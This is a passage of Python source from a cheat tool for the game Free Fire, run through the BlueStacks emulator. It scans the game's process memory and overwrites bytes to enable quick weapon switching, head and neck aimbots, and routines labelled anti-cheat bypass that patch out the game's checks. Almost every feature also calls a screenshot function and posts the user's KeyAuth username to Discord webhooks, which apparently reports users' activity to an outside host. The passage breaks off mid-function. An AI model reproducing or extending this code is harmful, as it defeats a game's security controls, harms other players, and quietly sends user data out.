            print("\033[31m[>]\033[0m SCANNING AWM QUICK CHANGE STREAMING MODE - KAR98 QUICK CHANGE STREAMING MODE...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 00 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 33"), return_multiple = True) #AWM QC
            print("\033[31m[>]\033[0m AWM QC FOUND | SCANNING M82B QC...")
            value2 = pattern_scan_all(proc.process_handle, mkp("9A 99 19 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F ?? ?? ?? 3F 00 00 ?? ?? 00 00 ?? ?? ?? ?? ?? 3F ?? ?? ?? 3F 00 00"), return_multiple = True) #M82B QC
            print("\033[31m[>]\033[0m M82B QC FOUND | SCANNING M24 QC...")
            value3 = pattern_scan_all(proc.process_handle, mkp("00 00 00 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 66 66 66 3F ?? ?? ?? 3F"), return_multiple = True) #M24 QC
            print("\033[31m[>]\033[0m M24 QC FOUND | SCANNING KAR98 QC...")
            value4 = pattern_scan_all(proc.process_handle, mkp("9A 99 19 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 20 41 00 00 34 42 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 9A 99 19 3F CD CC 0C 40 00 00 80 3F"), return_multiple = True) #KAR QC
            print("\033[31m[>]\033[0m KAR98 QC FOUND | WAITING FOR PATCHING...")
            
            
            #os.system('cls')
    except:
        input("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3 or value4:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4) 
        for addr in value2:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)    
        for addr in value3:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)    
        for addr in value4:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)        

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ALL SNIPER QC (Stream Mode)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')            

def AWMQC100():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AWMQC100()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 00 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 33"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("17 B7 D1 38"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AWM QUICK CHANGE 100%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def AWMQCSTREAMING():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AWMQCSTREAMING()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 00 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 33"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AWM QC (Stream Mode)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def M82BQC100():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return M82BQC100()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("9A 99 19 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F ?? ?? ?? 3F 00 00 ?? ?? 00 00 ?? ?? ?? ?? ?? 3F ?? ?? ?? 3F 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("17 B7 D1 38"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **M82B QUICK CHANGE 100%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def M82BQCSTREAMING():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return M82BQCSTREAMING()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("9A 99 19 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F ?? ?? ?? 3F 00 00 ?? ?? 00 00 ?? ?? ?? ?? ?? 3F ?? ?? ?? 3F 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **M82B QC (Stream Mode)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        ss_aksi(WEBHOOK_URL)
        input('press ENTER button to Continue...')

def M24QC100():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return M24QC100()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 00 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 66 66 66 3F ?? ?? ?? 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("17 B7 D1 38"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **M24 QUICK CHANGE 100%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def M24QCSTREAMING():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return M24QCSTREAMING()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 00 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 66 66 66 3F ?? ?? ?? 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **M24 QC (Stream Mode)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        ss_aksi(WEBHOOK_URL)
        input('press ENTER button to Continue...')

def KAR98QC100():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return KAR98QC100()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("9A 99 19 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 20 41 00 00 34 42 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 9A 99 19 3F CD CC 0C 40 00 00 80 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("17 B7 D1 38"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **KAR98 QUICK CHANGE 100%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def KAR98QCSTREAMING():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return KAR98QCSTREAMING()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("9A 99 19 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 20 41 00 00 34 42 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F 9A 99 19 3F CD CC 0C 40 00 00 80 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("9A 99 99 3E"), 4)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **KAR98 QC (Stream Mode)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def SG2QC100():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return SG2QC100()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("9A 99 99 3E 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? 00 00 40 40 00 00 20 41 00 00 34 42 ?? ?? ?? ?? 00 00 A0 3F 00 00 00 00 9A 99 99 3F 66 66 66 3F 00 00 80 3F 00 00 80 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("17 B7 D1 38 17 B7 D1 38"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **QUICK CHANGE M1887 100%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def SG2QC80():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return SG2QC80()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("9A 99 99 3E 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? 00 00 40 40 00 00 20 41 00 00 34 42 ?? ?? ?? ?? 00 00 A0 3F 00 00 00 00 9A 99 99 3F 66 66 66 3F 00 00 80 3F 00 00 80 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("9A 99 99 3E 17 B7 D1 38"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **QUICK CHANGE M1887 80%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')


                                                    
def AIMSNIPERMENU():
    os.system('cls')
    print("""
==================== SELECT MENU ====================
            [1] AWM  AIMBOT     [3] M24   AIMBOT
            [2] M82B AIMBOT     [4] KAR98 AIMBOT
                [88] ENABLE ALL AIMBOT
                [99] BACK TO MAIN MENU
=====================================================""")
    pilihan = input("Input Number: ")
    
    if pilihan == '1':
        AWMBOT()
    elif pilihan == '2':
        M82BBOT()
    elif pilihan == '3':
        M24BOT()
    elif pilihan == '4':
        KAR98BOT()
    elif pilihan == '88':
        ALLBOT()
    else:
        pass    
    
def QCSNIPERMENU():
    os.system('cls')
    print("""
=============================== SELECT MENU ======================================
    [1] AWM   QUICK CHANGE 100%             [2] AWM   QUICK CHANGE (STREAMING MODE)
    [3] M82B  QUICK CHANGE 100%             [4] M82B  QUICK CHANGE (STREAMING MODE)
    [5] M24   QUICK CHANGE 100%             [6] M24   QUICK CHANGE (STREAMING MODE)
    [7] KAR98 QUICK CHANGE 100%             [8] KAR98 QUICK CHANGE (STREAMING MODE)
                    [9] M1887 QUICK CHANGE (MENU)
                    [77] ENABLE ALL QUICK CHANGE 100% (SAFE / LOBBY)
                    [88] ENABLE ALL QUICK CHANGE (STREAMING MODE)
                    [99] BACK TO MAIN MENU
==================================================================================""")
    pilihan = input("Input Number: ")
    
    if pilihan == '1':
        AWMQC100()
    elif pilihan == '2':
        AWMQCSTREAMING()
    elif pilihan == '3':
        M82BQC100()
    elif pilihan == '4':
        M82BQCSTREAMING()
    elif pilihan == '5':
        M24QC100()
    elif pilihan == '6':
        M24QCSTREAMING()
    elif pilihan == '7':
        KAR98QC100()
    elif pilihan == '8':
        KAR98QCSTREAMING()
    elif pilihan == '9':
        os.system('cls')
        print("""====== M1887 MENU ======
  [1] QUICK CHANGE 100%
  [2] QUICK CHANGE 80%
  [99] BACK TO MAIN MENU
=========================""")
        sg2menu = input("Input Number: ")
        if sg2menu == '1':
            SG2QC100()
        elif sg2menu == '2':
            SG2QC80()                
    elif pilihan == '77':
        ALLQC100()
    elif pilihan == '88':
        ALLQCSTREAMING()
    else:
        pass  
    
def AIMBOTPRO():
    try:
        # Open the process
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        print("[>] BlueStacks is not running!")
        input("[>] Press Enter to Continue...")
        return

    try:
        if proc:
            print("\033[31m[>]\033[0m Base Address of Entity Found!")
            print("\033[31m[>]\033[0m Calculate And Patching...")
            # Scan for entities
            entity_pattern = "FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00"
            value1 = pattern_scan_all(proc.process_handle, mkp(entity_pattern), return_multiple=True)

            if value1:
                for current_entity in value1:

                    # Read the value at current_entity + 0x60
                    value_bytes = read_bytes(proc.process_handle, current_entity + 0x60, 4)

                    # Write the value to current_entity + 0x5C
                    write_bytes(proc.process_handle, current_entity + 0x5C, value_bytes, len(value_bytes))
                print("\033[31m[>]\033[0m Aimbot Pro Successfully - Have A Nice Game!")
                ss_aksi(WEBHOOK_URL)
                teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIMBOT HEAD**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                kirim_ke_discord(webhook_url2, teks)  
                input("press ENTER button to continue...")
            else:
                print("Only Work Ingame. No Entities Found")
                input("press ENTER button to continue...")

    except:
        print("Error.. Please Try Again!")
        input("press ENTER button to continue...")
    finally:
        if proc:
            proc.close_process()

def AIMNECK():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AIMNECK()
        else:
            return
              
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("62 6F 6E 65 5F 4E 65 63 6B 62 6F 6E 65 5F 53 70 69 6E 65 31 42 61 73 65 20 4C 61 79 65 72 2E 53 68 6F 77 46 69 73 74 42 61 73 65 20 4C 61 79 65 72 2E 53 74 61 6E 64 49 64 6C 65 42 61 73 65 20"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("62 6F 6E 65 5F 48 69 70 73 62 6F 6E 65 5F 4C 65 66 74 54 6F 65 62 6F 6E 65 5F 52 69 67 68 74 54 6F 65 49 53 56 49 53 49 42 4C 45 5F 43 41 4D 45 52 41 20 20 20 49 53 56 49 53 49 42 4C 45 5F 56 45 48 49 43 4C 45"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("62 6F 6E 65 5F 4E 65 63 73 62 6F 6E 65 5F 53 70 69 6E 65 31 42 61 73 65 20 4C 61 79 65 72 2E 53 68 6F 77 46 69 73 74 42 61 73 65 20 4C 61 79 65 72 2E 53 74 61 6E 64 49 64 6C 65 42 61 73 65 20"))
            
    if value2:          
        for addr in value2:
            replace(proc, addr, bytes.fromhex("62 6F 6E 65 5F 4E 65 63 6B 62 6F 6E 65 5F 4C 65 66 74 54 6F 65 62 6F 6E 65 5F 52 69 67 68 74 54 6F 65 49 53 56 49 53 49 42 4C 45 5F 43 41 4D 45 52 41 20 20 20 49 53 56 49 53 49 42 4C 45 5F 56 45 48 49 43 4C 45"))                     
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIMBOT NECK**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        ss_aksi(WEBHOOK_URL)
        input('press ENTER button to Continue...')    

def ANTICHEAT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ANTICHEAT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading... (ANTI CHEAT STEP 1 - 2)")
            value1 = pattern_scan_all(proc.process_handle, mkp("0A 00 A0 E3 ?? ?? ?? ?? ?? ?? ?? ?? 03"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("0A 00 A0 E3 ?? ?? ?? ?? ?? ?? ?? ?? 10"), return_multiple = True)
            print("\033[31m[>]\033[0m Step 1 Successfully!")
            value3 = pattern_scan_all(proc.process_handle, mkp("10 4C 2D E9 08 B0 8D E2 40 D0 4D E2 ?? ?? 9F E5 ?? ?? 9F E7 00 ?? ?? E5 0C"), return_multiple = True)
            value4 = pattern_scan_all(proc.process_handle, mkp("F0 4B 2D E9 18 B0 8D E2 18 D0 4D E2 00 90 A0 E1 E0"), return_multiple = True)
            print("\033[31m[>]\033[0m Step 2 Successfully!")
            print(f"""\033[31m[>] \033[92mStatus :
\033[31m[>] \033[92m\033[0m {len(value1)}
\033[31m[>] \033[92m\033[0m {len(value2)}
\033[31m[>] \033[92m\033[0m {len(value3)}
\033[31m[>] \033[92m\033[0m {len(value4)}
Note: if Some Status 0 = You need restart emulator!""")
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3 or value4:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("00 F0 20 E3"))  
        for addr in value2:
            replace(proc, addr, bytes.fromhex("00 F0 20 E3"))  
        for addr in value3:
            replace(proc, addr, bytes.fromhex("00 00 A0 E3 1E FF 2F E1"))  
        for addr in value4:
            replace(proc, addr, bytes.fromhex("00 00 A0 E3 1E FF 2F E1"))
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ANTI CHEAT FEATURES**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        ss_aksi(WEBHOOK_URL)
        input('press ENTER button to Continue...')  
        
        
def ANTICHEATBP():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ANTICHEATBP()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading... (ANTI CHEAT BYPASS STEP 1 - 2)")
            value1 = pattern_scan_all(proc.process_handle, mkp("F0 4B 2D E9 18 B0 8D E2 18 D0 4D E2 00 90 A0 E1 E0 01 9F E5"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("0A 00 A0 E3 6E 00 54 E3 3F 00 00 13 10 8C BD E8 08 00 A0 E3 00 00 00 EA 0D 00 A0 E3 70 00 FF"), return_multiple = True)
            print("\033[31m[>]\033[0m Step 1 Successfully!")
            value3 = pattern_scan_all(proc.process_handle, mkp("10 4C 2D E9 ?? B0 8D E2 ?? D0 4D E2 ?? ?? ?? ?? ?? ?? 9F ?? 00 20 ?? ?? ?? ?? ?? E5"), return_multiple = True)
            value4 = pattern_scan_all(proc.process_handle, mkp("10 4C 2D E9 08 B0 8D E2 40 D0 4D E2 E0 20 9F E5 02 20 9F"), return_multiple = True)
            print("\033[31m[>]\033[0m Step 2 Successfully!")
            print(f"""\033[31m[>] \033[92mStatus :
\033[31m[>] \033[92m\033[0m {len(value1)}
\033[31m[>] \033[92m\033[0m {len(value2)}
\033[31m[>] \033[92m\033[0m {len(value3)}
\033[31m[>] \033[92m\033[0m {len(value4)}
Note: if Some Status 0 = You need restart emulator!""")
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3 or value4:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("00 00 A0 E3 1E FF 2F E1"))  
        for addr in value2:
            replace(proc, addr, bytes.fromhex("00 F0 20 E3"))  
        for addr in value3:
            replace(proc, addr, bytes.fromhex("00 00 A0 E3 1E FF 2F E1"))  
        for addr in value4:
            replace(proc, addr, bytes.fromhex("00 00 A0 E3 1E FF 2F E1"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ANTI CHEAT BYPASS**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        ss_aksi(WEBHOOK_URL)
        input('press ENTER button to Continue...')  


def LOGOGARENA():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return LOGOGARENA()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("3C 51 88 E5 00 40"), return_multiple = True) #
            value2 = pattern_scan_all(proc.process_handle, mkp("28 01 87 E5 00 70 94 E5"), return_multiple = True) 
            
            
            #os.system('cls')
    except:
        input("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2:
        for addr in value1:
